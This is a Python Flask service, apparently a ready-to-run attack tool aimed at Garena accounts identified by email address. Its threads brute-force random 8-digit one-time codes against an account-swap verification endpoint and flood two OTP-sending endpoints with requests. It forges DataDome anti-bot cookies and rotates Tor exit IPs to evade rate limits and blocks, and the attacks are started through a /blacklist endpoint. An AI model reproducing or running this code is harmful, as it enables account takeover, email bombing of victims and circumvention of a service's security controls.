# app.py
import requests
import time
import json
import threading
import random
import re
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
import warnings
warnings.filterwarnings('ignore')

app = Flask(__name__)

active_attacks = {}
attack_lock = threading.Lock()
log_buffers = {}
tor_process = None
tor_started = False
tor_lock = threading.Lock()

def start_tor():
    global tor_process, tor_started
    with tor_lock:
        if tor_started:
            return True
        try:
            print("[*] Starting Tor...")
            tor_process = subprocess.Popen(
                ['tor'], 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            time.sleep(5)
            tor_started = True
            print("[*] Tor started successfully")
            return True
        except Exception as e:
            print(f"[!] Tor start error: {e}")
            return False

def check_tor():
    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        session.verify = False
        session.timeout = 10
        r = session.get('https://check.torproject.org/', timeout=10)
        return r.status_code == 200
    except:
        return False

def rotate_tor_ip():
    try:
        import stem
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("[*] Tor IP rotated")
        time.sleep(1)
        return True
    except:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(('127.0.0.1', 9051))
            s.send(b'AUTHENTICATE ""\r\n')
            s.send(b'SIGNAL NEWNYM\r\n')
            s.send(b'QUIT\r\n')
            s.close()
            print("[*] Tor IP rotated")
            time.sleep(1)
            return True
        except:
            try:
                subprocess.run(['pkill', '-HUP', 'tor'], capture_output=True)
                time.sleep(1)
                print("[*] Tor IP rotated")
                return True
            except:
                print("[!] Failed to rotate Tor IP")
                return False

def get_session(use_tor=True):
    session = requests.Session()
    if use_tor and tor_started:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    session.verify = False
    session.timeout = 15
    session.headers.update({'Connection': 'close'})
    return session

def add_log(email, log_line):
    with attack_lock:
        if email not in log_buffers:
            log_buffers[email] = []
        log_buffers[email].append({
            'time': time.time(),
            'message': log_line
        })
        if len(log_buffers[email]) > 1000:
            log_buffers[email] = log_buffers[email][-1000:]

def get_recent_logs(email):
    with attack_lock:
        if email not in log_buffers:
            return []
        cutoff = time.time() - 30
        return [log for log in log_buffers[email] if log['time'] > cutoff]

class EmailAttacker:
    def __init__(self, email):
        self.email = email
        self.running = True
        self.use_tor = True
        self.rotation_counter = 0
        self.stats = {
            "ss": {"checked": 0, "success": 0, "fail": 0, "error": 0},
            "ap": {"checked": 0, "success": 0, "fail": 0, "error": 0},
            "pp": {"checked": 0, "success": 0, "fail": 0, "error": 0}
        }
        self.pp_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Referer": "https://sso.garena.com/universal/register?locale=en-US",
            "Origin": "https://sso.garena.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Connection": "close"
        }
    
    def ss_attack(self):
        while self.running:
            try:
                self.rotation_counter += 1
                if self.rotation_counter % 5 == 0 and self.use_tor:
                    rotate_tor_ip()
                
                otp = random.randint(0, 99999999)
                otp_str = str(otp).zfill(8)
                headers = {
                    'User-Agent': 'GarenaMSDK/4.0.41',
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                session = get_session(self.use_tor)
                r = session.post(
                    'https://100067.connect.garena.com/game/account_security/swap:verify_otp',
                    data={'app_id': '100067', 'email': self.email, 'otp': otp_str, 'locale': 'en_HK'},
                    headers=headers,
                    timeout=15
                )
                self.stats["ss"]["checked"] += 1
                if r.status_code == 200:
                    self.stats["ss"]["success"] += 1
                    try:
                        data = r.json()
                        if data.get('swap_token') or data.get('token'):
                            add_log(self.email, f"[SS] SUCCESS OTP: {otp_str}")
                    except:
                        pass
                elif r.status_code in [429, 403, 401, 400]:
                    self.stats["ss"]["fail"] += 1
                    add_log(self.email, f"[SS] Blocked {r.status_code}")
                    if self.use_tor:
                        rotate_tor_ip()
                    time.sleep(2)
                else:
                    self.stats["ss"]["fail"] += 1
                session.close()
                time.sleep(0.1)
            except Exception as e:
                self.stats["ss"]["error"] += 1
                add_log(self.email, f"[SS] Error: {str(e)[:40]}")
                if self.use_tor:
                    rotate_tor_ip()
                time.sleep(2)
    
    def ap_attack(self):
        while self.running:
            try:
                self.rotation_counter += 1
                if self.rotation_counter % 5 == 0 and self.use_tor:
                    rotate_tor_ip()
                
                headers = {
                    'User-Agent': 'GarenaMSDK/4.0.42(M2006C3LII ;Android 10;en;GB;app 1.130.1 2019121038;)',
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Connection': 'close'
                }
                session = get_session(self.use_tor)
                data = {'app_id': '100067', 'email': self.email, 'locale': 'en_HK'}
                r = session.post(
                    'https://100067.connect.garena.com/game/account_security/swap:send_otp',
                    data=data,
                    headers=headers,
                    timeout=15
                )
                self.stats["ap"]["checked"] += 1
                if r.status_code == 200:
                    try:
                        if r.json().get('result') == 0:
                            self.stats["ap"]["success"] += 1
                            add_log(self.email, f"[AP] OTP SENT")
                        else:
                            self.stats["ap"]["fail"] += 1
                    except:
                        self.stats["ap"]["fail"] += 1
                elif r.status_code == 429:
                    self.stats["ap"]["fail"] += 1
                    add_log(self.email, f"[AP] Rate limit 429")
                    if self.use_tor:
                        rotate_tor_ip()
                    time.sleep(2)
                else:
                    self.stats["ap"]["fail"] += 1
                session.close()
                time.sleep(0.1)
            except Exception as e:
                self.stats["ap"]["error"] += 1
                add_log(self.email, f"[AP] Error: {str(e)[:40]}")
                if self.use_tor:
                    rotate_tor_ip()
                time.sleep(2)
    
    def get_datadome(self):
        try:
            session = get_session(self.use_tor)
            r = session.post(
                'https://datadome.garena.com/js/',
                data={
                    "jsType": "le",
                    "eventCounters": '{"mousemove":1,"click":1,"keydown":11}',
                    "ddk": "AE3F04AD3F0D3A462481A337485081",
                    "Referer": "https://sso.garena.com/universal/register?locale=en-SG",
                    "request": "/universal/register?locale=en-SG",
                    "responsePage": "origin",
                    "ddv": "5.7.0"
                },
                headers={
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://sso.garena.com/universal/register?locale=en-SG",
                    "Connection": "close"
                },
                timeout=15
            )
            if r.json().get('status') == 200:
                cookie_string = r.json().get('cookie', '')
                if 'datadome=' in cookie_string:
                    for part in cookie_string.split(';'):
                        if 'datadome=' in part:
                            return part.replace('datadome=', '').strip()
            return None
        except:
            return None
    
    def pp_attack(self):
        while self.running:
            try:
                self.rotation_counter += 1
                if self.rotation_counter % 5 == 0 and self.use_tor:
                    rotate_tor_ip()
                
                token = self.get_datadome()
                if not token:
                    self.stats["pp"]["error"] += 1
                    add_log(self.email, f"[PP] Failed datadome")
                    if self.use_tor:
                        rotate_tor_ip()
                    time.sleep(1)
                    continue
                    
                headers = self.pp_headers.copy()
                headers["Cookie"] = f"datadome={token}"
                payload = {
                    "username": "VaixSsootpx",
                    "email": self.email,
                    "locale": "en-US",
                    "format": "json",
                    "id": str(int(time.time() * 1000))
                }
                session = get_session(self.use_tor)
                response = session.post(
                    "https://sso.garena.com/api/send_register_code_email",
                    data=payload,
                    headers=headers,
                    timeout=15
                )
                self.stats["pp"]["checked"] += 1
                if response.status_code == 200:
                    try:
                        if response.json().get('status') == 'ok':
                            self.stats["pp"]["success"] += 1
                            add_log(self.email, f"[PP] OTP SENT")
                        else:
                            self.stats["pp"]["fail"] += 1
                    except:
                        self.stats["pp"]["fail"] += 1
                elif response.status_code in [403, 429]:
                    self.stats["pp"]["fail"] += 1
                    add_log(self.email, f"[PP] Blocked {response.status_code}")
                    if self.use_tor:
                        rotate_tor_ip()
                    time.sleep(2)
                else:
                    self.stats["pp"]["fail"] += 1
                session.close()
                time.sleep(0.1)
            except Exception as e:
                self.stats["pp"]["error"] += 1
                add_log(self.email, f"[PP] Error: {str(e)[:40]}")
                if self.use_tor:
                    rotate_tor_ip()
                time.sleep(2)
    
    def start_attack(self):
        add_log(self.email, "[*] Starting attack with Tor rotation")
        add_log(self.email, "[*] Running SS + AP + PP simultaneously")
        add_log(self.email, f"[*] Tor: {self.use_tor}")
        
        t1 = threading.Thread(target=self.ss_attack, daemon=True)
        t2 = threading.Thread(target=self.ap_attack, daemon=True)
        t3 = threading.Thread(target=self.pp_attack, daemon=True)
        
        t1.start()
        t2.start()
        t3.start()
        
        add_log(self.email, "[*] All 3 attack threads started")
        
        while self.running:
            time.sleep(30)
            add_log(self.email, f"[STATS] SS: {self.stats['ss']['checked']} | AP: {self.stats['ap']['checked']} | PP: {self.stats['pp']['checked']}")

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'service': 'Garena Email Attack API with Tor',
        'version': '1.0',
        'tor_status': 'running' if tor_started else 'stopped',
        'endpoints': {
            '/blacklist?email=X': 'Start attack on email',
            '/stop?email=X': 'Stop attack on email',
            '/status?email=X': 'Check attack status',
            '/logs?email=X': 'Get recent logs',
            '/health': 'Health check',
            '/tor/rotate': 'Manually rotate Tor IP'
        }
    })

@app.route('/health')
def health():
    with attack_lock:
        running = len([x for x in active_attacks.values() if x.get('status') == 'running'])
    
    return jsonify({
        'status': 'ok',
        'active_attacks': running,
        'tor_status': 'running' if tor_started else 'stopped'
    })

@app.route('/tor/rotate')
def rotate_tor():
    if not tor_started:
        return jsonify({'error': 'Tor not started'}), 400
    
    if rotate_tor_ip():
        return jsonify({'status': 'rotated', 'message': 'Tor IP rotated successfully'})
    else:
        return jsonify({'error': 'Failed to rotate Tor IP'}), 500

@app.route('/blacklist')
def blacklist():
    email = request.args.get('email')
    
    if not email:
        return jsonify({'error': 'Email required'}), 400
    
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        return jsonify({'error': 'Invalid email format'}), 400
    
    with attack_lock:
        if email in active_attacks and active_attacks[email].get('status') == 'running':
            return jsonify({'status': 'already_running', 'email': email})
    
    def run():
        try:
            attacker = EmailAttacker(email)
            with attack_lock:
                active_attacks[email] = {'status': 'running', 'start_time': time.time(), 'attacker': attacker}
            attacker.start_attack()
            with attack_lock:
                active_attacks[email]['status'] = 'stopped'
        except Exception as e:
            print(f"Error: {e}")
            with attack_lock:
                if email in active_attacks:
                    active_attacks[email]['status'] = 'error'
                    active_attacks[email]['error'] = str(e)
    
    threading.Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'email': email, 'tor': tor_started})

@app.route('/stop')
def stop():
    email = request.args.get('email')
    if not email:
        return jsonify({'error': 'Email required'}), 400
    
    with attack_lock:
        if email not in active_attacks:
            return jsonify({'status': 'not_found', 'email': email})
        if active_attacks[email].get('attacker'):
            active_attacks[email]['attacker'].running = False
            active_attacks[email]['status'] = 'stopped'
            return jsonify({'status': 'stopped', 'email': email})
    return jsonify({'status': 'error'})

@app.route('/status')
def status():
    email = request.args.get('email')
    if not email:
        return jsonify({'error': 'Email required'}), 400
    
    with attack_lock:
        if email not in active_attacks:
            return jsonify({'status': 'not_found'})
        info = active_attacks[email]
        if info.get('attacker'):
            stats = info['attacker'].stats
            return jsonify({
                'email': email,
                'status': info['status'],
                'tor': tor_started,
                'stats': stats
            })
    return jsonify({'status': 'not_found'})

@app.route('/logs')
def logs():
    email = request.args.get('email')
    if not email:
        return jsonify({'error': 'Email required'}), 400
    return jsonify({
        'email': email,
        'logs': [log['message'] for log in get_recent_logs(email)[-20:]]
    })

@app.route('/active')
def active():
    with attack_lock:
        return jsonify({
            'active': {k: v for k, v in active_attacks.items() if v.get('status') == 'running'}
        })

if __name__ == '__main__':
    print("=" * 60)
    print("GARENA EMAIL ATTACK API WITH TOR")
    print("=" * 60)
    
    if start_tor():
        time.sleep(3)
        if check_tor():
            print("[*] Tor is working correctly")
        else:
            print("[!] Tor might not be working properly")
    else:
        print("[!] Tor failed to start, continuing without Tor")
    
    port = int(os.environ.get('PORT', 8080))
    print(f"[*] Server running on port: {port}")
    print("=" * 60)
    
    app.run(host='2001:41d0:306:277a::2417', port=8080, debug=False, threaded=True)